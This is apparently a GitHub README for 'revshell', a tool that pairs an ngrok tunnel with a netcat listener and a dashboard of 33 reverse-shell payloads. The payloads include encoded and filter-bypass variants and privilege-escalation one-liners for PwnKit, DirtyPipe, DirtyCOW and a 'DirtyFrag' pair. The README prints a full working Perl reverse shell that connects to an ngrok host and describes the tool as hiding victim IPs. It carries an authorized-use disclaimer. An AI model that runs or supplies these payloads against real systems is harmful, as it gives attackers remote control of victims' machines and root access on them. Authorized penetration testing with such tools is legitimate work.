# ███ REVSHELL ███

**one-shot ngrok + netcat reverse shell listener with a live web dashboard**

```
 ██████╗ ███████╗██████╗ ██╗  ██╗██╗   ██╗███████╗██╗  ██╗
██╔════╝ ██╔════╝██╔══██╗██║ ██╔╝██║   ██║██╔════╝╚██╗██╔╝
██║  ███╗█████╗  ██████╔╝█████╔╝ ██║   ██║█████╗   ╚███╔╝
██║   ██║██╔══╝  ██╔══██╗██╔═██╗ ██║   ██║██╔══╝   ██╔██╗
╚██████╔╝███████╗██║  ██║██║  ██╗╚██████╔╝███████╗██╔╝ ██╗
 ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
      author : madtiger    Telegram : DevidLuice    v2.2
```

`revshell` opens an **ngrok tcp tunnel** and a **netcat listener on the same random 4-digit port**, then serves a local **web dashboard** where every payload is generated with the live ngrok host/port and ready to copy in one click.

## screenshot

![revshell dashboard — monitor tab](screenshots/dashboard.png)

![revshell dashboard — payloads tab](screenshots/payloads.png)

![revshell dashboard — privesc CVE tab](screenshots/cves.png)

## features

- **one command** — `revshell -tcp` does everything: random 4-digit port, ngrok tunnel, `nc -lnvp`, dashboard
- **web dashboard** (`127.0.0.1`) — matrix rain, CRT scanlines, glitch logo, live status cards
- **live monitor** — sessions opened/closed in real time, uptime, shells caught, listener state
- **payload arsenal** — 33 payloads in 4 sections, auto-filled with your live ngrok endpoint:
  - `basic` — perl, bash, python, php, nc (-e / no -e), ruby, socat, powershell
  - `encoded` — base64, double-base64, hex pipeline, url-encoded, powershell -enc
  - `bypass` — `${IFS}` space bypass, quote/slash stripping, keyword blacklists (`$0`), mkfifo nc relay
  - `cve` — public privesc one-liners: **PwnKit** (CVE-2021-4034), **DirtyPipe** (CVE-2022-0847), **DirtyCOW** (CVE-2016-5195), **DirtyFrag** (CVE-2026-43284 + CVE-2026-43500) + a recon one-liner to pick the right one
- **one-click copy** — copy button on every card, or click anywhere on a command
- **clean terminal** — banner, tunnel, `listening >>>>>`, then your shell. nothing else
- **safe teardown** — session end, `Ctrl+C`, `SIGTERM` or `SIGHUP` all tear down ngrok + nc, no orphans
- single file · python 3 stdlib only · no dependencies

## install

```bash
sudo cp revshell.py /usr/local/bin/revshell
sudo chmod +x /usr/local/bin/revshell
```

requires: `ngrok` (authenticated), `nc`/`ncat`

## usage

```bash
revshell -tcp                # random 4-digit port + dashboard auto-opens
revshell -tcp -p 4444        # fixed local port
revshell -tcp --no-browser   # don't auto-open the dashboard
revshell -tcp --web 8080     # fixed dashboard port
```

terminal output stays minimal:

```
[+] tunnel up    : 0.tcp.in.ngrok.io:11044 → 127.0.0.1:1337
[+] dashboard    : http://127.0.0.1:38107  (monitor · payloads · cve)

╔═════════════════════════════════════════════╗
║   listening >>>>> 0.tcp.in.ngrok.io:11044   ║
╚═════════════════════════════════════════════╝

Listening on 0.0.0.0 1337
```

fire a payload on the target — the shell lands in your terminal and the dashboard feed logs the session:

```bash
perl -e 'use Socket;$i="0.tcp.in.ngrok.io";$p=11044;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

## notes

- victim IPs are hidden behind the ngrok edge — the dashboard tracks sessions via the local relay
- the dashboard binds `127.0.0.1` only
- privesc CVE one-liners pull public PoCs from their original repos — check the affected versions on each card before firing

## legal

for **authorized** use only — your own labs, CTFs, and engagements you have permission to test. the privesc exploits modify page cache and `/etc/passwd` on live systems.

---

**author** : madtiger · **Telegram** : DevidLuice
